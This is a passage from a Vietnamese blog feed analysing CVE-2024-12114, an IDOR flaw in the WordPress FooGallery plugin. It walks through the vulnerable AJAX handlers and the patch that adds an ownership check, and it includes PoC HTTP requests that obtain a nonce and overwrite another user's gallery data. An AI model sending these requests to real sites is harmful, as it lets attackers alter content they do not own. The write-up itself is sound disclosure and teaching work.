$_POST[&amp;#39;nonce&amp;#39;], &amp;#39;foogallery-modal-nonce&amp;#39; ) ) {&#xA;        die ( &amp;#39;Busted!&amp;#39;);&#xA;    }&#xA;&#xA;    $img_id = intval( sanitize_text_field( $_POST[&amp;#39;img_id&amp;#39;] ) );&#xA;&#xA;    if ( $img_id &amp;gt; 0 ) {&#xA;        do_action( &amp;#39;foogallery_attachment_save_data&amp;#39;, $img_id, $foogallery );&#xA;    }&#xA;    &#xA;    wp_die();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm lấy &lt;code&gt;foogallery&lt;/code&gt; từ request, kiểm tra nếu là một mảng có giá trị thì tiếp tục kiểm tra &lt;code&gt;nonce&lt;/code&gt; đảm bảo request hợp lệ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! wp_verify_nonce( $_POST[&amp;#39;nonce&amp;#39;], &amp;#39;foogallery-modal-nonce&amp;#39; ) ) {&#xA;    die ( &amp;#39;Busted!&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;wp_verify_nonce()&lt;/code&gt; sẽ kiểm tra giá trị &lt;code&gt;nonce&lt;/code&gt; gửi lên có hợp lệ (&lt;code&gt;nonce&lt;/code&gt; được tạo bởi action &lt;code&gt;foogallery-modal-nonce&lt;/code&gt;) hay không.&lt;/p&gt;&#xA;&lt;p&gt;Nếu hợp lệ và &lt;code&gt;img_id &amp;gt; 0&lt;/code&gt;, &lt;code&gt;do_action(&#39;foogallery_attachment_save_data&#39;,...)&lt;/code&gt; đuợc gọi với giá trị của &lt;code&gt;img_id&lt;/code&gt; và &lt;code&gt;foogallery&lt;/code&gt; từ request.&lt;/p&gt;&#xA;&lt;p&gt;Trước đó, plugin đã đăng ký một loạt các callback cho action &lt;code&gt;foogallery_attachment_save_data&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/add_action.png&#34; title=&#34;Các callback được đăng ký cho action foogallery_attachment_save_data&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/add_action.png&#34; data-sub-html=&#34;&lt;h2&gt;Add action&lt;/h2&gt;&lt;p&gt;Các callback được đăng ký cho action foogallery_attachment_save_data&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/add_action.png&#39; alt=&#34;Add action&#34; height=&#34;521&#34; width=&#34;1913&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Các callback được đăng ký cho action foogallery_attachment_save_data&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function foogallery_attachment_save_data_main( $img_id, $data ) {&#xA;&#xA;    if ( is_array( $data ) &amp;amp;&amp;amp; !empty( $data ) ) {&#xA;&#xA;        $foogallery_post = array(&#xA;            &amp;#39;ID&amp;#39; =&amp;gt; $img_id&#xA;        );&#xA;&#xA;        if ( array_key_exists( &amp;#39;title&amp;#39;, $data ) ) {&#xA;            $foogallery_post[&amp;#39;post_title&amp;#39;] = $data[&amp;#39;title&amp;#39;];&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;caption&amp;#39;, $data ) ) {&#xA;            $foogallery_post[&amp;#39;post_excerpt&amp;#39;] = $data[&amp;#39;caption&amp;#39;];&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;description&amp;#39;, $data ) ) {&#xA;            $foogallery_post[&amp;#39;post_content&amp;#39;] = $data[&amp;#39;description&amp;#39;];&#xA;        }&#xA;&#xA;        // Update post meta values&#xA;        if ( array_key_exists( &amp;#39;alt-text&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_wp_attachment_image_alt&amp;#39;, $data[&amp;#39;alt-text&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;custom-url&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_foogallery_custom_url&amp;#39;, $data[&amp;#39;custom-url&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;custom-target&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_foogallery_custom_target&amp;#39;, $data[&amp;#39;custom-target&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;custom-class&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_foogallery_custom_class&amp;#39;, $data[&amp;#39;custom-class&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( is_array( $foogallery_post ) &amp;amp;&amp;amp; count( $foogallery_post ) &amp;gt; 1 ) {&#xA;            // Update the post into the database&#xA;            wp_update_post( $foogallery_post );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public function foogallery_attachment_save_data_taxonomies( $img_id, $data ) {&#xA;    if ( is_array( $data ) &amp;amp;&amp;amp; !empty( $data ) ) {&#xA;&#xA;        if ( !$this-&amp;gt;attachments_have_taxonomies() ) {&#xA;            return;&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;taxonomies&amp;#39;, $data ) ) {&#xA;            foreach ( $data[&amp;#39;taxonomies&amp;#39;] as $taxonomy =&amp;gt; $taxonomy_value ) {&#xA;                $terms = explode( &amp;#39;,&amp;#39;, $taxonomy_value );&#xA;                if ( is_array( $terms ) ) {&#xA;                    $terms = array_map( &amp;#39;intval&amp;#39;, $terms );&#xA;                    wp_set_object_terms( $img_id, $terms, $taxonomy, false );&#xA;                }&#xA;            }&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public function foogallery_attachment_save_data_thumbnails( $img_id, $data ) {&#xA;    if ( is_array( $data ) &amp;amp;&amp;amp; !empty( $data ) ) {&#xA;&#xA;        if ( array_key_exists( &amp;#39;crop_pos&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;foogallery_crop_pos&amp;#39;, $data[&amp;#39;crop_pos&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;override-thumbnail-id&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;foogallery_override_thumbnail&amp;#39;, $data[&amp;#39;override-thumbnail-id&amp;#39;] );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public function foogallery_attachment_save_data_advanced($img_id, $data ) {&#xA;    if ( is_array( $data ) &amp;amp;&amp;amp; !empty( $data ) ) {&#xA;        if ( array_key_exists( &amp;#39;data-width&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_data-width&amp;#39;, $data[&amp;#39;data-width&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;data-height&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_data-height&amp;#39;, $data[&amp;#39;data-height&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;panning&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_foobox_panning&amp;#39;, $data[&amp;#39;panning&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;override_type&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_foogallery_override_type&amp;#39;, $data[&amp;#39;override_type&amp;#39;] );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Các callback thực hiện một loạt các update với gallery tương ứng với &lt;code&gt;img_id&lt;/code&gt; và dữ liệu là &lt;code&gt;foogallery&lt;/code&gt;, tất cả đều có thể được kiểm soát bởi attacker.&lt;/p&gt;&#xA;&lt;p&gt;Lỗ hổng IDOR xảy ra vì không có ràng buộc nào đối với gallery tương ứng &lt;code&gt;img_id&lt;/code&gt; khiến kẻ tấn công có thể gửi request tùy ý để chỉnh sửa nội dung gallery không thuộc quyền của mình.&lt;/p&gt;&#xA;&lt;p&gt;Bản vá &lt;code&gt;v2.4.30&lt;/code&gt; đã thêm ràng buộc:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( current_user_can(&amp;#39;edit_post&amp;#39;, $img_id ) ) {&#xA;    do_action( &amp;#39;foogallery_attachment_save_data&amp;#39;, $img_id, $foogallery );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/patch.png&#34; title=&#34;Bản vá&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;Bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/patch.png&#39; alt=&#34;Patch&#34; height=&#34;470&#34; width=&#34;1814&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Chỉ người dùng có quyền &lt;code&gt;edit_post&lt;/code&gt; với id &lt;code&gt;$img_id&lt;/code&gt; thì mới được phép gọi đến action &lt;code&gt;foogallery_attachment_save_data&lt;/code&gt; để chỉnh sưa nó.&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;Điều tiên quyết là cần tìm cách để lấy được giá trị của nonce tương ứng với action &lt;code&gt;foogallery-modal-nonce&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create_nonce.png&#34; title=&#34;Xây dựng nonce với action foogallery-modal-nonce&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/create_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Create nonce&lt;/h2&gt;&lt;p&gt;Xây dựng nonce với action foogallery-modal-nonce&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create_nonce.png&#39; alt=&#34;Create nonce&#34; height=&#34;464&#34; width=&#34;1730&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Xây dựng nonce với action foogallery-modal-nonce&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Nonce được khởi tạo trong hàm &lt;code&gt;build_modal_data()&lt;/code&gt; bằng cách gọi &lt;code&gt;wp_create_nonce( &#39;foogallery-modal-nonce&#39; )&lt;/code&gt; và nếu đáp ứng 2 điều kiện:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$data&lt;/code&gt; là một mảng&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;img_id&lt;/code&gt; và &lt;code&gt;gallery_id&lt;/code&gt; khác &lt;code&gt;null&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Hàm &lt;code&gt;build_modal_data&lt;/code&gt; sẽ trả về mảng có chứa giá trị bao gồm &lt;code&gt;nonce&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/embed_nonce.png&#34; title=&#34;Giá trị của nonce được thêm vào HTML&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/embed_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Embed nonce&lt;/h2&gt;&lt;p&gt;Giá trị của nonce được thêm vào HTML&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/embed_nonce.png&#39; alt=&#34;Embed nonce&#34; height=&#34;961&#34; width=&#34;1372&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Giá trị của nonce được thêm vào HTML&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Giá trị này được hàm &lt;code&gt;ajax_open_modal&lt;/code&gt; sử dụng, &lt;code&gt;nonce&lt;/code&gt; sẽ được thêm vào HTML với form id là &lt;code&gt;foogallery_attachment_modal_save_form&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Nhưng trước đó, &lt;code&gt;ajax_open_modal&lt;/code&gt; sẽ thực hiện kiểm tra nonce tương ứng với action &lt;code&gt;foogallery_attachment_modal_open&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! wp_verify_nonce( $_POST[&amp;#39;nonce&amp;#39;], &amp;#39;foogallery_attachment_modal_open&amp;#39; ) ) {&#xA;    die ( &amp;#39;Busted!&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create_nonce1.png&#34; title=&#34;Xây dựng nonce với action foogallery_attachment_modal_open&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/create_nonce1.png&#34; data-sub-html=&#34;&lt;h2&gt;Create nonce&lt;/h2&gt;&lt;p&gt;Xây dựng nonce với action foogallery_attachment_modal_open&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create_nonce1.png&#39; alt=&#34;Create nonce&#34; height=&#34;1067&#34; width=&#34;1918&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Xây dựng nonce với action foogallery_attachment_modal_open&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Đọc logic của hàm, ta thấy nonce sẽ được thêm vào HTML của &lt;strong&gt;edit gallery&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;Sử dụng chức năng &lt;strong&gt;edit gallery&lt;/strong&gt; =&amp;gt; cho request qua BurpSuite =&amp;gt; Filter request với từ khóa &lt;code&gt;foogallery-image-edit-modal&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/data_nonce.png&#34; title=&#34;Giá trị của nonce trong khi filter&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/data_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Data nonce&lt;/h2&gt;&lt;p&gt;Giá trị của nonce trong khi filter&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/data_nonce.png&#39; alt=&#34;Data nonce&#34; height=&#34;532&#34; width=&#34;956&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Giá trị của nonce trong khi filter&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ta lấy được giá trị của nonce này&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Authenticated User (Subscriber&amp;#43;)&amp;#34;] &#xA;--&amp;gt; B[&amp;#34;Request admin-ajax.php?action=foogallery_attachment_modal_open&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Verify nonce: foogallery_attachment_modal_open&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;Return HTML modal &amp;#43; embedded nonce (foogallery-modal-nonce)&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;User extracts nonce from response&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Send request: action=foogallery_attachment_modal_save&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Verify nonce: foogallery-modal-nonce&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;Extract img_id from request&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;No capability / ownership check (edit_post)&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;do_action(foogallery_attachment_save_data, img_id, data)&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;Update post / attachment data&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;Unauthorized modification of arbitrary gallery/post (IDOR)&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Thực hiện edit galery với user có quyền &lt;code&gt;Gallery Creator&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Search từ khóa &lt;code&gt;foogallery-image-edit-modal&lt;/code&gt; và lấy nonce từ response&lt;/li&gt;&#xA;&lt;li&gt;Gửi request để lấy nonce tương ứng với form &lt;code&gt;foogallery_attachment_modal_save_form&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: valid_cookie&#xA;&#xA;action=foogallery_attachment_modal_open&amp;amp;nonce=9ad3ed3e9b&amp;amp;img_id=1&amp;amp;gallery_id=1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/get_nonce.png&#34; title=&#34;Lấy nonce từ response&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/get_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Get nonce&lt;/h2&gt;&lt;p&gt;Lấy nonce từ response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/get_nonce.png&#39; alt=&#34;Get nonce&#34; height=&#34;656&#34; width=&#34;954&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Lấy nonce từ response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Gửi request để thay đổi data của gallery bất kỳ&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: valid_cookie&#xA;&#xA;action=foogallery_attachment_modal_save&amp;amp;nonce=11bfc5f814&amp;amp;foogallery[]=any_data&amp;amp;img_id=1&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;&#xA;&lt;p&gt;Sử dụng UI để thực hiện:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Truy cập &lt;code&gt;http://localhost/wp-admin/post.php?post=post_id&amp;amp;action=edit#&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Thực hiện edit và save&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/edit.png&#34; title=&#34;Edit and save&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/edit.png&#34; data-sub-html=&#34;&lt;h2&gt;Edit&lt;/h2&gt;&lt;p&gt;Edit and save&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/edit.png&#39; alt=&#34;Edit&#34; height=&#34;1002&#34; width=&#34;1879&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Edit and save&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng xảy ra do &lt;strong&gt;thiếu kiểm tra quyền truy cập (authorization)&lt;/strong&gt; đối với &lt;code&gt;img_id&lt;/code&gt;.&lt;br&gt;&#xA;Mặc dù có kiểm tra nonce, plugin vẫn cho phép người dùng đã đăng nhập thao tác lên &lt;strong&gt;gallery không thuộc quyền sở hữu&lt;/strong&gt;, dẫn đến &lt;strong&gt;IDOR&lt;/strong&gt;.&lt;br&gt;&#xA;Bản vá 2.4.30 khắc phục bằng cách kiểm tra &lt;code&gt;current_user_can( &#39;edit_post&#39;, $img_id )&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nonce &lt;strong&gt;không thay thế&lt;/strong&gt; cho kiểm soát quyền&lt;/li&gt;&#xA;&lt;li&gt;Phải kiểm tra quyền theo &lt;strong&gt;đối tượng cụ thể (object-level)&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Không tin dữ liệu client, kể cả khi có nonce&lt;/li&gt;&#xA;&lt;li&gt;IDOR thường xuất hiện trong AJAX handler thiếu &lt;code&gt;current_user_can()&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/foogallery/vulnerability/wordpress-foogallery-plugin-2-4-29-insecure-direct-object-reference-to-authenticated-custom-arbitrary-post-page-updates-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress FooGallery Plugin &amp;lt;= 2.4.29 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-10039 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-28-cve-2025-10039/</link>
